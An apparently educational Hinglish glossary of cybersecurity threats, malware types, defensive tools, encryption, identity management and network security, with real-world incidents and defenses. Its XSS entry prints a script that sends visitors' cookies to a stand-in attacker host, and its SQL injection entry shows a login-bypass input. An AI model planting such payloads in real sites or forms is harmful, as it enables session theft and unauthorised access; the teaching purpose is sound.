Core Threats & Attacks

The most common weapons attackers use — yeh sab basic attacks hain jo real-world mein sabse zyada hote hain.

🦠
Malware
Malicious Software — digital "zeher"
Threat ▾
What is it

Malware = Malicious + Software. Koi bhi software jo deliberately tumhare system ko harm karta hai — data churaata hai, corrupt karta hai, ya control leta hai.

Types ka overview

Virus, Worm, Trojan, Ransomware, Spyware, Adware, Rootkit, Keylogger — sab malware ke hi forms hain. Agle chapter mein har ek detail mein hai.

🧠 Analogy

Malware ek bimari ki tarah hai. Jaise flu (virus), jaundice (spyware jo slowly damage kare), ya cholera (worm jo paani se spread ho) — sab alag hai, sab nuksan karta hai, par sab "bimari" hi hai.

📰 Real World

WannaCry (2017): 150 countries mein ek worm-based malware ne UK ke NHS hospitals, Telefónica Spain, aur FedEx ko paralyze kar diya. $4 billion+ estimated loss. Ek unpatched Windows vulnerability se spread hua.

🛡️ Defense
  • Updated antivirus always run karo
  • OS aur software patches turant apply karo
  • Unknown links/files pe click mat karo
  • Regular backups rakho offline
Severity
Critical
🎣
Phishing
Digital makka — "fishing" for your credentials
Threat ▾
What is it

Attacker ek fake email/website/SMS banaata hai jo bilkul legit dikhti hai (bank, Google, Amazon). Tum usmein apni credentials enter karo — aur woh chala jaata hai.

Types

Spear Phishing: Targeted attack (naam se bulata hai)
Whaling: CEOs ko target
Smishing: SMS se
Vishing: Voice call se

📰 Real World

Google & Facebook Scam (2013-2015): Evaldas Rimasauskas ne Lithuania se fake invoices Google aur Facebook ko bheji (impersonating Quanta Computer). $100M+ chura liye. Dono companies ne actually pay kiya!

🛡️ Defense
  • Sender ka email address dhyan se check karo
  • Links pe hover karo URL dekhne ke liye pehle click se
  • Koi bhi urgency feel ho — ruko, verify karo
  • 2FA enable karo har jagah
Severity
Critical
💰
Ransomware
Digital kidnapping — "pay up or lose everything"
Threat ▾
What is it

Malware jo tumhare saare files encrypt kar deta hai (lock), phir Bitcoin mein payment maangta hai key ke liye. Pay karo ya data jaata hai.

How it spreads

Phishing emails, malicious attachments, unpatched software, RDP bruteforce. Ek infected machine poore network ko infect kar sakti hai.

// How It Works
  • Malware system pe install hota hai (usually phishing se)
  • Quietly files dhundhta hai — documents, photos, databases
  • Strong encryption (AES-256) se sab files lock kar deta hai
  • Screen pe ransom note dikhta hai with Bitcoin address
  • Timer shuru hota hai — nahi diya to price badhta hai ya key delete
📰 Real World

Colonial Pipeline (2021): US ki sabse badi fuel pipeline band ho gayi jab DarkSide ransomware ne attack kiya. $4.4 million ransom diya gaya. East coast mein fuel shortage aayi, panic buying shuru. Biden ne national emergency declare kiya.

🛡️ Defense
  • Offline backups (3-2-1 rule: 3 copies, 2 media, 1 offsite)
  • Network segmentation — infection spread na ho
  • RDP access restrict karo
  • Pay mat karo — koi guarantee nahi key milegi
Severity
Critical
🤖
Botnet
Army of infected computers controlled remotely
Threat ▾
What is it

Hazaron ya laakhon infected computers ka ek network, jise ek "bot herder" (attacker) remotely control karta hai. Tumhara PC bina tumhare jaane bot ban sakta hai.

Uses

DDoS attacks, spam sending, crypto mining, credential theft, ad fraud. Attacker yeh bots dark web pe rent pe bhi deta hai doosron ko.

🧠 Analogy

Sochao koi tumhare phone ko secretly remote control kar raha hai. Tum normal use kar rahe ho, but background mein woh kisi par spam bhej raha hai ya kisi website ko attack kar raha hai tumhare naam se.

📰 Real World

Mirai Botnet (2016): IoT devices (cameras, routers) ko infect kar ke ek massive botnet banaya gaya. Iska use Dyn DNS pe DDoS attack karne ke liye hua jisse Twitter, Netflix, Amazon, Reddit — sab down ho gaye US mein ek din ke liye.

Severity
High
💥
DDoS
Distributed Denial of Service — traffic flood se server crash
Threat ▾
What is it

Hazaron bots ek hi server par ek saath itna traffic bhejte hain ki server handle nahi kar paata aur crash ya freeze ho jaata hai. Real users access nahi kar paate.

DoS vs DDoS

DoS: Single machine se attack (easy to block)
DDoS: Distributed = hazaron machines se (almost impossible to block)

📰 Real World

GitHub (2018): 1.35 Tbps ka attack — history ka biggest DDoS at that time. Memcached servers ka exploit karke amplification attack tha. GitHub 10 minutes tak down raha phir Akamai ne traffic absorb kiya.

🛡️ Defense
  • CDN use karo (Cloudflare, Akamai) jo traffic absorb kare
  • Rate limiting implement karo
  • Anycast network diffusion
  • ISP-level filtering

MITM Attack
Man-in-the-Middle — conversation intercept karna
Threat ▾
What is it

Attacker do parties ke beech mein secretly ghus jaata hai. Tum sochte ho tum bank se baat kar rahe ho, par actually attacker beech mein hai, data padhta aur modify karta hai.

Types

ARP Spoofing: Local network pe
DNS Spoofing: Wrong IP deta hai
SSL Stripping: HTTPS → HTTP downgrade
Evil Twin: Fake WiFi hotspot

🧠 Analogy

Tumne apne dost ko letter bheja. Par postman ne woh letter open kiya, padhा, kuch badla, seal band kiya, aur bheja. Dono kisi ko nahi pata kuch hua bhi hai. Exactly yahi MITM hai.

📰 Real World

Public WiFi MITM: Coffee shop/airport ke open WiFi par attacker "Evil Twin" attack karta hai — same naam ka fake hotspot. Tum connect hote ho, woh sab traffic dekh sakta hai.

Severity
Critical
💉
SQL Injection
Database mein malicious code inject karna
Threat ▾
What is it

Web forms mein SQL code enter karke database ko trick kiya jaata hai. Attacker login bypass kar sakta hai, data chura sakta hai, ya database delete kar sakta hai.

Why it works

Jab website user input ko directly SQL query mein daalti hai bina sanitize kiye, attacker SQL command as input deta hai jo database execute kar leta hai.

// Normal login query: SELECT * FROM users WHERE username='admin' AND password='abc123'; // Attacker types this in username field: admin'-- // Resulting query (password check SKIPPED!): SELECT * FROM users WHERE username='admin'--' AND password='abc'; // -- is comment in SQL, so password part ignored!
📰 Real World

Heartland Payment Systems (2008): SQL injection se 130 million credit card numbers chori hue. $140 million+ settlement. At that time, US history ki largest data breach.

🛡️ Defense
  • Parameterized queries / prepared statements use karo
  • Input validation aur sanitization
  • WAF (Web Application Firewall) use karo
  • Principle of least privilege for database users
Severity
Critical
📜
XSS
Cross-Site Scripting — dusre ki site pe apna script
Threat ▾
What is it

Attacker website mein malicious JavaScript inject karta hai. Jab koi user woh page open kare, unka browser attacker ka script run karta hai — cookies, session tokens chori ho sakte hain.

Types

Stored XSS: Script database mein save (e.g. comments)
Reflected XSS: URL mein script inject
DOM-based: Client-side manipulation

// Attacker posts this "comment" on a forum: <script>document.location='http://evil.com/steal?c='+document.cookie</script> // Anyone who reads the page sends their cookies to attacker!
📰 Real World

Samy Worm (MySpace, 2005): Samy Kamkar ne MySpace profile pe XSS script daali. Ek din mein 1 million+ profiles ne automatically "Samy is my hero" add kar liya. Ek teen ki prank ne history ka fastest spreading virus banaya.

Severity
High
🔄
CSRF
Cross-Site Request Forgery — browser se unwanted action
Threat ▾
What is it

Tum bank.com mein logged in ho. Attacker tumhe ek evil website pe le jaata hai. Woh website background mein bank.com pe request bhejti hai tumhare naam se — tumhara pata bhi nahi.

Why it works

Browser automatically cookies bhejta hai same domain ke requests mein. Attacker iska fayda uthata hai — tumhara browser auth karta hai, request jayegi.

🧠 Analogy

Koi tumhara haath pakad ke ek cheque pe sign karwa leta hai jab tum neend mein ho. Tumne kiya nahi, par signature tumhara hai. CSRF exactly aisa — browser tumhara auth use karta hai bina tumhare jaane.

🛡️ Defense
  • CSRF tokens — har request mein unique token
  • SameSite cookie attribute
  • Origin header verify karo server side
Severity
High
0️⃣
Zero-Day Exploit
Unknown vulnerability — patch exist hi nahi karta
Threat ▾
What is it

"Zero days" because vendor ko zero days mila fix karne ke liye — vulnerability abhi abhi discover hua, patch nahi bana, aur attacker already exploit kar raha hai.

Market

Zero-day exploits dark web pe $1M+ mein bika karte hain. NSA, intelligence agencies bhi buy karti hain. Google ka Project Zero team inka hunt karta hai.

📰 Real World

Stuxnet (2010): US+Israel jointly banaya ek zero-day exploit jo Iran ke nuclear centrifuges ko physically damage karne ke liye. 4 zero-days ek saath use kiye — unprecedented. Iran ke Natanz facility mein 1,000 centrifuges destroy huye bina koi bomb use kiye.

Severity
Critical
🦠

Malware Types

Malware ke alag-alag forms — sab damage karte hain, par alag tarike se

🧬
Virus
Self-replicating — files se files mein spread
Malware▾
What is it

Virus ek malicious code hai jo existing files mein attach ho jaata hai. Jab infected file run karo, virus execute hota hai aur doosri files ko infect karna shuru karta hai. Human action required hai spread ke liye (file share karo).

Key characteristic

Human help required. Automatic nahi spread hota. Tumhe infected file kisi ko deni padti hai — email, USB, download se. Biological virus jaisa — carrier chahiye.

🧠 Analogy

Biological flu virus jaisa. Apne aap nahi chalta — kisi infected insaan se contact chahiye. Ek infected USB → tumhara PC → tumhara shared drive → colleagues.

📰 Real World

ILOVEYOU (2000): Email attachment "LOVE-LETTER-FOR-YOU.txt.vbs" — millions ne open kiya, $10 billion damage, 50 million computers infected in 10 days.

Severity
High
🪱
Worm
Self-spreading — bina help ke network mein failta hai
Malware▾
Virus se difference

Worm standalone hai — kisi file se attach nahi hota, koi human action nahi chahiye. Network vulnerabilities exploit karke apne aap spread hota hai. Ek infected machine → poora network.

Impact

Network bandwidth kha jaata hai, servers overload karta hai. Side payloads bhi carry karta hai — ransomware, keyloggers deliver kar sakta hai automatically.

📰 Real World

WannaCry (2017): EternalBlue exploit (NSA ka stolen tool) use karke Windows SMB vulnerability pe attack. No user action needed — bas network connection chahiye tha. 300,000+ computers 150 countries mein.

Severity
Critical
🐴
Trojan Horse
Fake useful software — andar kuch aur
Malware▾
What is it

Legit software ki tarah dikhta hai (game, utility, crack) par andar malicious code hota hai. Tum khud install karte ho. Greek mythology ke Trojan Horse jaise — gift ke andar soldiers.

Types

Banking Trojans (credentials chori), RATs (remote access), Backdoor Trojans (attacker ka entry point), Downloader Trojans (aur malware download karte hain).

📰 Real World

Zeus Trojan (2007-2010): Banking credentials chori karta tha. 70,000+ organizations affect, $70 million+ stolen including NASA computers. Ek pirated game ke saath typically aata tha.

Severity
Critical
👤
Rootkit
OS level invisibility cloak — detection se chupta hai
Malware▾
What is it

OS ke deepest level (kernel) mein install hota hai. Apne aap ko aur doosre malware ko antivirus se hide karta hai. "Root" = highest admin access, "Kit" = tools.

Why dangerous

Standard antivirus detect nahi kar paata. OS ke andar se hi system calls intercept karta hai aur fake information return karta hai. Remove karna almost impossible.

📰 Real World

Sony BMG CD Rootkit (2005): Sony ne music CDs mein rootkit embed kiya DRM ke liye. 22 million CDs affected. Users ke computers pe bina bataye install ho jaata tha. Massive lawsuit, public outrage.

Severity
Critical
⌨️
Keylogger
Har keystroke record karta hai — passwords, messages sab
Malware▾
What is it

Background mein quietly tumhare keyboard ke har key press ko record karta hai. Phir log file attacker ko bhejta hai. Tumhara bank password, personal messages, credit card — sab caught.

Types

Software: OS level mein hook
Hardware: Physical device keyboard aur PC ke beech
Browser-based: Form data intercept

🛡️ Defense
  • Virtual keyboard use karo banking ke liye
  • 2FA se keylogger useless ho jaata hai passwords ke liye
  • Physical keyboard ports check karo public computers pe
Severity
High
👁️
Spyware
Silently monitor karta hai — data collect karke bhejna
Malware▾
What is it

Background mein chup ke tumhari activities monitor karta hai — browsing history, location, contacts, camera/microphone access, screenshots. Data attacker ko remotely bhejta hai.

Vs Keylogger

Keylogger sirf keystrokes, Spyware broader — screenshots, file access, location, social media, call logs sab.

📰 Real World

Pegasus Spyware (NSO Group): iOS aur Android zero-click exploit se install hota tha — tumhe kuch click bhi nahi karna. Journalists, activists, world leaders ke phones compromise. Saudi Arabia ne use kiya journalist Jamal Khashoggi ke network ko monitor karne ke liye.

Severity
Critical
📢
Adware
Unwanted ads dikhata hai — mostly annoying, sometimes dangerous
Malware▾
What is it

Automatically ads show karta hai — popups, browser redirects, fake alerts. Revenue generate karta hai advertiser ke liye. Free software ke saath bundled aata hai often.

Danger level

Mostly annoying, but some adware spyware ka gateway hai. Malvertising (malicious ads) se serious malware download ho sakta hai. Browser settings hijack kar leta hai.

Severity
Medium
👻
Fileless Malware
No files — RAM mein rehta hai, antivirus dhundh nahi paata
Malware▾
What is it

Disk pe koi file nahi likhta. Directly RAM mein run karta hai ya Windows ke legitimate tools (PowerShell, WMI) ko abuse karta hai. Antivirus file scan nahi kar sakta kyunki file hi nahi hai.

Technique

Living-off-the-land (LotL) attack. PowerShell, cmd, regedit — Windows ke apne tools use karta hai. Computer restart pe woh gone — par tab tak kaafi damage kar chuka hota hai.

📰 Real World

Operation Cobalt Kitty (2017): Vietnamese bank pe APT attack. 6 mahine tak undetected raha kyunki PowerShell aur WMI tools use karta tha. $200M+ theft attempt.

Severity
Critical
🖥️
RAT
Remote Access Trojan — full remote control of your PC
Malware▾
What is it

Attacker tumhara poora computer remotely control kar sakta hai — mouse, keyboard, camera, microphone, files, install software. TeamViewer jaisa, but without your knowledge.

What attacker can do

Screen dekh sakta hai live, camera on kar sakta hai, files copy/delete, keylog, bank transfers, screenshot, aur tumhare PC ko botnet mein add.

📰 Real World

Blackshades RAT (2012-2014): 17-year-old Swedish teen ne banaya, $40 pe dark web pe becha. 700,000 computers compromise. Miss Teen USA ki webcam se photos leak. FBI ne worldwide sting operation chalayi.

Severity
Critical
💼
RaaS
Ransomware as a Service — cybercrime franchise model
Malware▾
What is it

SaaS ki tarah, but evil. Ransomware developers apna malware dark web pe "rent" pe dete hain. Koi bhi coding nahi jaanta buy kar sakta hai, attack kar sakta hai. Revenue split hoti hai developer aur attacker ke beech.

Business model

70-30 split typically. Developer 30% leta hai ransom ka, attacker 70%. Support bhi milta hai, control panel, ransom negotiation services. Full criminal enterprise.

📰 Real World

DarkSide RaaS: Colonial Pipeline attack isi se hua. Professional website thi, customer support, even a "code of ethics" — hospitals attack mat karo. Pure criminal SaaS business.

Severity
Critical
🛡️

Defensive Tools & Technologies

Yeh weapons tumhari taraf hain — organizations inhe use karti hain apna bachav karne ke liye

🔥
Firewall
Network traffic ka gatekeeper — allow/block rules
Defense▾
What is it

Network traffic monitor karta hai aur predefined rules ke basis pe allow ya block karta hai. Ek border guard ki tarah — passport check karo, phir andar jaane do.

Types

Packet Filtering: IP/port check
Stateful: Connection state track
NGFW: Deep packet inspection, app-aware
WAF: Web apps ke liye specifically

🧠 Analogy

Building ka security guard. Rules hai — employees andar, strangers stop. Firewall bhi aisa — trusted IP allow, unknown ports block. But smart attacker allowed port use karta hai (bypass).

Effectiveness
Essential
💊
Antivirus / Anti-Malware
Malware detect aur remove karne ka software
Defense▾
How it works

Signature-based: Known malware ke "fingerprints" se match
Heuristic: Suspicious behavior detect karo (new malware ke liye)
Sandboxing: Isolated environment mein run karke dekho

Limitation

Signature-based antivirus sirf known threats detect karta hai. Zero-day, fileless malware, polymorphic malware (jo apna code change karta hai) se bachna mushkil. Modern AV + behavior analysis zaroori hai.

Effectiveness
Good but not enough alone
🚨
IDS
Intrusion Detection System — alert deta hai attack pe
Defense▾
What is it

Network/system traffic monitor karta hai suspicious activity ke liye. Kuch galat dikhta hai to alert bhejta hai security team ko. But khud kuch nahi karta — sirf bolta hai "kuch ho raha hai!"

Types

NIDS: Network-based (poora network traffic dekhe)
HIDS: Host-based (ek specific machine dekhe)
Signature-based: Known attack patterns
Anomaly-based: Normal se deviation detect kare

🧠 Analogy

Smoke detector. Aag lagti hai, alarm bajta hai. But khud aag nahi bujhaata — tumhe call karna padega fire brigade (human response). IDS detect karta hai, IPS block bhi karta hai.

🚒
IPS
Intrusion Prevention System — detect + automatically block
Defense▾
IDS vs IPS

IDS = passive (sirf alert), IPS = active (alert + automatically block karta hai). IPS network path mein inline hota hai — traffic isse hoke jaata hai, woh inspect karta hai, aur block kar sakta hai real-time mein.

Risk

False positives ka risk — legitimate traffic bhi block ho sakta hai. Production systems mein carefully configure karna padta hai nahi to business impact hota hai.

📊
SIEM
Security Information & Event Management — central dashboard
Defense▾
What is it

Poore organization ke saare security tools se logs collect karta hai ek jagah, correlate karta hai, patterns dhundta hai, aur threats identify karta hai. SOC team ka main tool.

Examples

Splunk, IBM QRadar, Microsoft Sentinel, LogRhythm. Large enterprises mein terabytes of daily logs ek dashboard pe analyze hote hain.

🧠 Analogy

CCTV control room of a mall — hazaron cameras ek jagah. Guard sab dekh sakta hai ek monitor pe. Alag-alag cameras dekhen to pattern miss ho jaaye, SIEM central view deta hai.

🌐
WAF
Web Application Firewall — web apps ke liye specific protection
Defense▾
What is it

Normal firewall packets block karta hai, WAF HTTP traffic ko analyze karta hai specifically. SQL injection, XSS, CSRF detect aur block karta hai web layer pe.

Where it sits

Web server aur internet ke beech. Cloudflare, AWS WAF, Imperva popular solutions hain. Har incoming web request ko scan karta hai malicious patterns ke liye.

💻
Endpoint Security
Individual devices (laptops, phones) ko protect karna
Defense▾
What is it

Har individual device (endpoint) ko secure karna — laptops, phones, tablets, servers. Sirf antivirus nahi — EDR (Endpoint Detection & Response) tools real-time behavior monitor karte hain.

Modern Approach

EDR tools (CrowdStrike, SentinelOne) behavior analytics, threat hunting, automated response sab karte hain. Zero-day bhi detect ho sakta hai anomalous behavior se.

🔒
DLP
Data Loss Prevention — sensitive data bahar nahi jaane deta
Defense▾
What is it

Monitor aur control karta hai ki sensitive data (credit cards, SSN, confidential docs) organization se bahar na jaaye — email, USB, cloud uploads ke through.

How

Content inspection — emails scan karta hai "confidential" patterns ke liye. Block kar deta hai ya alert deta hai. Insider threats ke against especially useful.

📦
Sandbox
Isolated environment — suspicious files test karo safely
Defense▾
What is it

Isolated virtual environment jahan suspicious files ya programs run kiye jaate hain safely. Agar malware hai to real system affect nahi hoga — sandbox ke andar hi confined.

Usage

Email attachments, unknown executables, browser extensions — pehle sandbox mein run karo, behavior dekho, phir decide karo. Automated malware analysis ke liye use hota hai.

🧠 Analogy

Chemical lab mein hazardous material ke liye glove box. Bahar effects nahi pahunch sakte, andar jaake experiment kar sakte ho safely.

🍯
Honeypot
Decoy system — attackers ko attract karo, unhe study karo
Defense▾
What is it

Deliberately vulnerable fake system jo attackers ko lure karta hai. Jab attacker ise target karta hai, security team unke tactics, techniques, tools study kar sakti hai real-time mein.

Benefits

Early warning system. Attacker iska real system samajh ke attack karta hai, par actually decoy hai. Unke methods log hote hain — future defenses improve hote hain.

🧠 Analogy

Police ka undercover operation ya bait car. Woh deliberately exposed car chodh ke thieves attract karte hain, phir catch karte hain ya unhe study karte hain patterns ke liye.

🔐

Encryption & Protocols

Data ko scramble karna taaki sirf sahi log padhein — internet ki neev

🔐
Encryption
Data ko unreadable banana — sirf key se padhein
Crypto▾
What is it

Plaintext ko ciphertext mein convert karna using an algorithm aur key. Bina key ke — garbage. Key ke saath — original data. Two types: Symmetric (same key) aur Asymmetric (public/private key pair).

Types

Symmetric: AES — same key encrypt aur decrypt karne ke liye. Fast.
Asymmetric: RSA — public key se encrypt, private key se decrypt. Slower but more secure.

// Simple Caesar cipher (not real encryption, just concept): Plaintext: HELLO Key: +3 Ciphertext: KHOOR // Real AES-256 looks like this (128 chars of gibberish): a3f8e9c7b2d1f4e8c9b3a2d1f4e8c9b3a2d1f4e8...
🧠 Analogy

Tumhara diary mein secret language likhna — sirf tumhe pata hai "cat = 7, dog = 9". Key yaad ho to padhlo, nahi to gibberish. Encryption exactly aise, par mathematically unbreakable.

💬
End-to-End Encryption (E2EE)
Sirf sender aur receiver padh sakte — beech mein koi nahi
Crypto▾
What is it

Message sirf sender ke device pe encrypt hota hai aur sirf receiver ke device pe decrypt hota hai. Server bhi nahi padh sakta — even WhatsApp apne messages nahi padh sakta.

Apps using E2EE

WhatsApp (Signal Protocol), Signal, iMessage (when blue), Telegram (Secret Chats only — normal chats E2EE nahi hain!). Regular email E2EE nahi hai.

🔢
AES
Advanced Encryption Standard — industry gold standard symmetric encryption
Crypto▾
What is it

US government approved symmetric encryption algorithm. AES-128, AES-192, AES-256 (key size). AES-256 is unbreakable with today's computers — even supercomputer billions of years lagenge.

Used everywhere

Wi-Fi (WPA2), HTTPS, file encryption, banking, WhatsApp messages, disk encryption (BitLocker, FileVault). Tum daily AES use karte ho without knowing.

🏛️
PKI
Public Key Infrastructure — trust management system
Crypto▾
What is it

Public key pairs, digital certificates, Certificate Authorities (CA) ka poora framework. Identity verify karta hai online — kaisa pata chale ki google.com actually Google hai aur fake site nahi?

Components

CA (Certificate Authority): Trusted issuer (DigiCert, Let's Encrypt)
Digital Certificate: Identity proof
CRL: Revoked certificates ki list

📜
Digital Certificate
Online ID card — identity prove karta hai
Crypto▾
What is it

Electronic document jo ek entity ki identity prove karta hai aur unki public key contain karta hai. CA (Certificate Authority) issue karta hai. Browser ka padlock icon yahi hai.

Contains

Owner name, public key, issuing CA, validity dates, domain name, CA's digital signature (tamper proof).

🧠 Analogy

Passport jaisa. Government (CA) ne issue kiya, tumhara photo aur details hain (public key), expiry date hai, aur tamper-proof features hain. Bank ne passport dekha → trust kiya.

✍️
Digital Signature
Authenticity prove karna — tamper detect karna
Crypto▾
What is it

Apni private key se document ko "sign" karna. Koi bhi tumhari public key se verify kar sakta hai ki document tumne hi sign kiya aur modify nahi hua. Non-repudiation provide karta hai.

Process

1. Document ka hash generate karo
2. Private key se hash encrypt karo (= signature)
3. Receiver: same hash generate karo, public key se signature decrypt karo, match karo

🔓
SSL
Secure Sockets Layer — now deprecated, replaced by TLS
Crypto▾
What is it

Secure communication protocol jo browser aur server ke beech encrypted connection establish karta hai. Ab technically deprecated hai — TLS use hota hai, par "SSL" term abhi bhi common hai.

History

SSL 2.0 (1995) → SSL 3.0 → TLS 1.0 → TLS 1.1 → TLS 1.2 → TLS 1.3 (current). SSL 3.0 mein POODLE vulnerability thi isliye abandon kiya gaya.

🛡️
TLS
Transport Layer Security — SSL ka successor, internet ki backbone
Crypto▾
What is it

Current secure communication protocol. Jab tum HTTPS use karte ho, actually TLS run ho raha hai. Encryption, authentication, integrity — teeno provide karta hai.

TLS Handshake

1. Client: "Hello, I support TLS 1.3"
2. Server: "OK, here's my certificate"
3. Key exchange
4. Encrypted communication begins

🔒
HTTPS
HTTP + TLS — secure website communication
Crypto▾
What is it

HTTP (web protocol) + TLS (encryption) = HTTPS. Browser ka padlock icon = HTTPS. Data encrypted hai transit mein — MITM attacker garbled text hi dekhega.

Misconception

HTTPS = secure site NAHI. Sirf matlab hai connection encrypted hai. Fake phishing sites bhi HTTPS use karti hain. Padlock ≠ trustworthy website.

⌨️
SSH
Secure Shell — encrypted remote server access
Crypto▾
What is it

Remote server ko securely access karna command line se. Web developers, system admins daily use karte hain. Telnet (unencrypted predecessor) ko replace kiya 1995 mein.

SSH Keys

Password ke alawa SSH keys use kar sakte ho — more secure. Public key server pe, private key tumhare paas. Brute force practically impossible.

// Connecting to a server via SSH: ssh username@192.168.1.100 // With a specific key file: ssh -i ~/.ssh/id_rsa username@server.com
🆔

Identity & Access Management

Who are you? Kya tumhe yahan rehne ka haq hai? Yeh sab IAM decide karta hai.

📱
2FA
Two-Factor Authentication — password + something else
IAM▾
What is it

Login ke liye 2 cheezein chahiye: kuch tum jaante ho (password) + kuch tumhare paas hai (phone OTP) ya kuch tum ho (fingerprint). Password chori bhi ho to koi faida nahi attacker ko.

Types

SMS OTP (weakest — SIM swap possible), Authenticator App (better — Google Auth, Authy), Hardware Key (strongest — YubiKey), Biometric.

🧠 Analogy

ATM — PIN (kuch tum jaante ho) + ATM card (kuch tumhare paas hai). Sirf PIN nahi, sirf card nahi — dono chahiye. 2FA yahi concept online.

📰 Real World

2023 mein MGM Resorts hack mein — social engineering se employee credentials mili. Agar proper MFA hota to hack fail ho jaata. $100M+ loss directly 2FA missing ki wajah se.

🔑
MFA
Multi-Factor Authentication — 2FA ka superset
IAM▾
2FA vs MFA

2FA specifically 2 factors. MFA = 2 ya zyada factors. Three categories: Knowledge (password), Possession (phone/token), Inherence (biometric). Mix karo — harder to breach.

Factors

🧠 Know: Password, PIN, security question
📱 Have: Phone, security key, smart card
👁️ Are: Fingerprint, face, iris, voice
📍 Where: Location-based (bonus layer)

👥
IAM
Identity & Access Management — who gets what access
IAM▾
What is it

Framework aur tools jo define karte hain ki kaun user kaun sa resource access kar sakta hai. User accounts banao, permissions assign karo, review karo. Okta, Microsoft Azure AD popular tools.

Principle

Least Privilege: Har user sirf woh access mile jo kaam ke liye absolutely zaroori hai — extra nahi. Agar DB admin ko billing system access nahi chahiye, nahi milega.

👑
PAM
Privileged Access Management — admin accounts ka special protection
IAM▾
What is it

IAM ka subset jo specifically privileged accounts (admins, root, service accounts) ko protect karta hai. These accounts are highest risk — inka control matlab full system control.

Features

Just-in-time access (sirf jab zaroori), session recording (admin ne kya kiya), password vaulting (auto-rotate passwords), MFA enforcement.

🗝️
SSO
Single Sign-On — ek login, sab access
IAM▾
What is it

Ek baar login karo (Google ya company account se), sab apps automatically accessible. "Sign in with Google" = SSO. Token exchange hota hai behind the scenes (OAuth, SAML).

Risk

SSO account compromise = sab apps compromise. Isliye SSO account pe strong MFA absolutely zaroori. "Single point of failure" bhi ho sakta hai.

🚫
Zero Trust Security
"Never trust, always verify" — koi bhi trusted nahi by default
IAM▾
What is it

Traditional model: network ke andar ho to trusted. Zero Trust: andar ya bahar koi fark nahi — har request verify karo, least privilege do, assume breach. "Trust but verify" → "Never trust, always verify."

Why important

Remote work, cloud era mein "corporate network" ka concept gone. Employees anywhere se kaam karte hain. Zero Trust ke bina insider threats aur compromised accounts devastating hote hain.

📰 Real World

Google ka BeyondCorp — industry ka pehla large-scale Zero Trust implementation (post-Operation Aurora 2010 China hack). Now industry standard recommendation.

🚪
Access Control
Resources tak kaun ja sakta hai — policy enforcement
IAM▾
Models

DAC: Owner decide karta hai (files on your PC)
MAC: System decide karta hai (military, classified)
RBAC: Role-based (employees, managers, admins)
ABAC: Attribute-based (time, location, device)

Example RBAC

HR role = employee data access. Finance role = payroll access. Developer role = code repo access. Mix nahi hota. Role change karo, permissions automatically change.

🪪
Authentication
"Tum kaun ho?" — identity prove karna
IAM▾
What is it

Identity verify karna — prove karo tum wahi ho jo tum claim karte ho. Password, biometric, token — sab authentication methods hain.

Authentication vs Authorization

Authentication = WHO are you? (Passport check)
Authorization = WHAT can you do? (Visa allows entry to certain areas)

✅
Authorization
"Tumhe kya karne ka haq hai?" — permissions check
IAM▾
What is it

Authenticated user ko kya resources access karne ki permission hai. Login ke baad — "can this user read/write/delete this file?" Authorization decide karta hai.

Fails when

Broken Access Control — OWASP Top 10 mein #1. User A ki ID change karke User B ka data access karna (IDOR). Horizontal aur vertical privilege escalation.

🎫
Token
Digital proof of identity — baar baar login mat karo
IAM▾
What is it

Login ke baad server ek token deta hai (string of characters). Agle requests mein password ki jagah token bhejo. Limited time ke liye valid. JWT (JSON Web Token) most common.

JWT Structure

Header.Payload.Signature — 3 parts dot se separated. Payload mein user info (encrypted nahi, base64 encoded!). Signature server verify karta hai.

🧠 Analogy

Movie ticket. Counter pe ID dikhaya (login), ticket mila (token). Ab har movie hall mein token dikhao — baar baar ID nahi dikhani. Ticket expire hoti hai (token expiry).

🌐

Network & Cloud Security

Data travel karta hai — usse protect karna aur cloud era ki challenges

🔮
VPN
Virtual Private Network — encrypted tunnel through internet
Network▾
What is it

Tumhare device aur VPN server ke beech encrypted tunnel. ISP, network admin, hackers — koi nahi dekh sakta tum kya browse kar rahe ho. Tumhara IP bhi VPN server ka IP dikhta hai.

Uses

Privacy (ISP se hide), regional content access, public WiFi pe safety, company network remote access. Free VPNs se beware — they sell your data.

🧠 Analogy

Glass tunnel ke through jaana vs opaque armored tube. Normal internet = glass — sab dekh sakte hain. VPN = opaque tube — bahar se kuch nazar nahi.

🧱
Network Segmentation
Network ko zones mein todna — damage isolate karna
Network▾
What is it

Ek bada network ko smaller segments mein divide karna (VLANs, subnets). Finance network se developer network alag. Ek zone compromise ho to doosre safe rahein.

Why critical

Lateral movement prevent karta hai. Attacker ek machine compromise kare par poore network mein freely nahi ghoom sakta. Colonial Pipeline worm bhi segmentation se rok sakte the.

☠️
DNS Poisoning
DNS cache corrupt karna — wrong IP pe redirect
Network▾
What is it

DNS server ki cache mein fake records inject karna. "google.com = 1.2.3.4" — yeh galat IP hai par DNS ye record return karta hai. User google.com type kare, attacker site pe jaaye.

DNS kya hai

Phone book of internet. "google.com" → "142.250.195.46" translate karta hai. DNS poisoning is phonebook mein galat entries daalna.

🔄
NAT
Network Address Translation — private IPs hide karna
Network▾
What is it

Tumhare ghar ke saare devices ek public IP share karte hain (router ka). Router andar private IPs maintain karta hai. Internet se direct access nahi hota internal devices ko — security benefit.

Home Network

Phone: 192.168.1.5, Laptop: 192.168.1.6 — private IPs. Router: 103.45.67.89 — public IP. Internet pe sirf router ka IP dikhta hai.

🕸️
SDN
Software Defined Networking — network programmable banana
Network▾
What is it

Traditional networks mein hardware configure karo manually. SDN mein software se network control hota hai centrally. Security policies dynamically apply ho sakti hain, faster response to threats.

Security benefit

Threat detect hote hi, SDN controller automatically affected segment isolate kar sakta hai. Micro-segmentation easily implement. Cloud networks aise hi work karte hain.

☁️
CASB
Cloud Access Security Broker — cloud apps ka security gateway
Network▾
What is it

Employees cloud apps (Google Drive, Dropbox, Salesforce) use karte hain. CASB monitor karta hai kya data cloud pe ja raha hai, unauthorized apps ka use ("shadow IT") detect karta hai.

Use case

Employee ne confidential doc Dropbox personal pe upload kiya. CASB detect karta hai — alert ya block. DLP + cloud = CASB.

🏠
IoT
Internet of Things — internet-connected physical devices
Network▾
What is it

Smart devices jo internet se connected hain — smart bulbs, cameras, fridges, thermostats, wearables, industrial sensors, medical devices. Billions of devices globally.

Scale

2030 tak 75 billion+ IoT devices expected. Har device ek potential entry point. Most IoT devices have terrible security — no updates, weak passwords, old firmware.

🔐
IoT Security
Smart devices ko secure karna — mushkil kaam
Network▾
Why hard

Limited processing power (can't run complex security), no screen/keyboard for setup, vendors update nahi karte, users default passwords change nahi karte, long lifecycle (10-20 years).

Best practices

Default passwords change karo, separate network/VLAN pe rakho IoT devices, firmware update karo, unnecessary features disable karo, network monitoring rakho.

📰 Real World

